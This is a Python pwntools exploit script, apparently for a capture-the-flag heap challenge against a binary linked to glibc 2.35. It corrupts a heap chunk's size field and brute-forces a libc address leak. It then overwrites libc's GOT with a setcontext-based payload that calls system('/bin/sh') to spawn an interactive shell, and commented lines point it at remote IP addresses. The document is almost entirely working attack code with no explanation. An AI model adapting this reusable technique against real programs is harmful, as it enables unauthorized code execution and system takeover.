from pwn import *

elf = ELF("./prob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = elf

p = process(stdout=PIPE)
# p = remote("3.38.215.165", 13378)
# p = remote("localhost", 13378)
# p = remote("3.38.43.123", 13378)
def create_ucontext(
    src: int,
    rsp=0,
    rbx=0,
    rbp=0,
    r12=0,
    r13=0,
    r14=0,
    r15=0,
    rsi=0,
    rdi=0,
    rcx=0,
    r8=0,
    r9=0,
    rdx=0,
    rip=0xDEADBEEF,
) -> bytearray:
    b = bytearray(0x200)
    b[0xE0:0xE8] = p64(src)  # fldenv ptr
    b[0x1C0:0x1C8] = p64(0x1F80)  # ldmxcsr

    b[0xA0:0xA8] = p64(rsp)
    b[0x80:0x88] = p64(rbx)
    b[0x78:0x80] = p64(rbp)
    b[0x48:0x50] = p64(r12)
    b[0x50:0x58] = p64(r13)
    b[0x58:0x60] = p64(r14)
    b[0x60:0x68] = p64(r15)

    b[0xA8:0xB0] = p64(rip)  # ret ptr
    b[0x70:0x78] = p64(rsi)
    b[0x68:0x70] = p64(rdi)
    b[0x98:0xA0] = p64(rcx)
    b[0x28:0x30] = p64(r8)
    b[0x30:0x38] = p64(r9)
    b[0x88:0x90] = p64(rdx)

    return b


def setcontext32(libc: ELF, **kwargs) -> (int, bytes):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt_trampoline = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    return got, flat(
        p64(0),
        p64(got + 0x218),
        p64(libc.symbols["setcontext"] + 32),
        p64(plt_trampoline) * 0x40,
        create_ucontext(got + 0x218, rsp=libc.symbols["environ"] + 8, **kwargs),
    )

def create(index, key, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(index).encode())
    p.sendlineafter(b': ', str(key).encode())
    p.sendlineafter(b': ', size)
    if(size != b'-' and int(size) <= 1024):
        p.sendafter(b': ', data)

def edit(index, key, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(index).encode())
    p.sendlineafter(b': ', str(key).encode())
    p.recvuntil(b'Data(')
    leak = int(p.recvuntil(b')', drop=True))
    p.sendafter(b': ', data)
    return leak

def delete(index, key):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(index).encode())
    p.sendlineafter(b': ', str(key).encode())

create(0, 0, b"20", b'a')
create(0, 0, b"20000", b'')
create(1, 0, b"1024", b'b')
for i in range(20):
    create(2, 0, b"1024", b'b')

edit(0, 0, b'a' * 24 + pack(0x410 * 2 + 0x40 + 1))

delete(1, 0)

create(2, 0, b'20', b'a')
for i in range(0x7000, 0x7fff):
    create(1, i, b'-', b'a')
    res = p.recvline()
libc_base = 0
for i in range(0x7000, 0x7fff):
    print(0x7fff - i)
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', b'1')
    p.sendlineafter(b': ', str(i).encode())
    leak = p.recvline(timeout=1)
    if(leak != b'Error\n'):
        from ctypes import c_uint
        print(leak, i)
        libc_base = c_uint(int(leak[5:-18])).value + (i << 32) - 0x21ace0
        print(hex(libc_base))
        break
libc.address = libc_base
    
create(3, 0, "20", b'd' * 19)
create(3, 0, "20000", b'')
create(4, 0, "20", b'd' * 19)

# edit(4, 0, b'a' * 8)

dest, payload = setcontext32(libc, rip=libc.sym['system'], rdi=next(libc.search(b'/bin/sh')))

edit(3, 0, b'\x00' * 0x20 + pack(dest) + pack(0x2000))
edit(4, 0, payload)

context.log_level = 'debug'
p.interactive()
